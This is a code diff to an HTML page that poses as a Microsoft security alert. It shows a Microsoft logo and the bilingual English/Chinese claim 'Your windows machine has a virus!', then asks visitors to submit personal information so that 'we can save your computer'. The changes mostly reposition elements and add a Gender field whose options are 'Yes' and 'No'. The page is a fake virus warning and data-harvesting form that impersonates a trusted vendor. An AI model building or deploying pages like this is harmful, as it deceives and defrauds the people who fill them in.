@@ -1,15 +1,23 @@
 <!DOCTYPE html>
-
+<html>
 
 <style>
 
-div#div1 {
+    div#div1 {
 
-position:absolute;
-left: 50px;
-top: 10px;
+        position:absolute;
+        left: 300px;
+        top: 40px;
+        font-size: 20px;
 
-}
+    }
+
+    div#div2 {
+
+        position:absolute;
+        top: 120px;
+
+    }
 
 
 </style>
@@ -19,12 +27,11 @@ top: 10px;
     <title>! Action Recommended ! / ! 建议行动 !</title>
 </head>
 
-<body style="background-color: azure;">
-    <img src=https://evergreenleadership.com/wp-content/uploads/2019/05/microsoft-logo-png-transparent-20.png
-        width="200px" height="auto" float="left" position="fixed">
+<img src=https://evergreenleadership.com/wp-content/uploads/2019/05/microsoft-logo-png-transparent-20.png width="200px" height="auto" float="left" position="fixed">
 
-    <div position="absolute" left="50px" top="10px">Your windows machine has a virus! / 你的windows机器有病毒!</div>
+<div id="div1">Your windows machine has a virus! / 你的windows机器有病毒!</div>
 
+<div id="div2">
     <p>Please enter your personal information so that we can save your computer! / 请输入您的个人信息，以便我们保存您的电脑!</p>
     <form action="action_page.php" method="POST">
 
@@ -93,6 +100,16 @@ top: 10px;
         <br>
 
         <div>
+            <label for="Gender">Gender:</label>
+            <select id="Gender" name="Gender">
+                <option value="Yes">Yes</option>
+                <option value="No">No</option>
+            </select>
+        </div>
+        
+        <br>
+
+        <div>
             <input type="reset">
         </div>
 
@@ -101,24 +118,8 @@ top: 10px;
         <div>
             <input type="submit">
         </div>
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+    
 
     </form>
-</body>
+</div>
+</html>
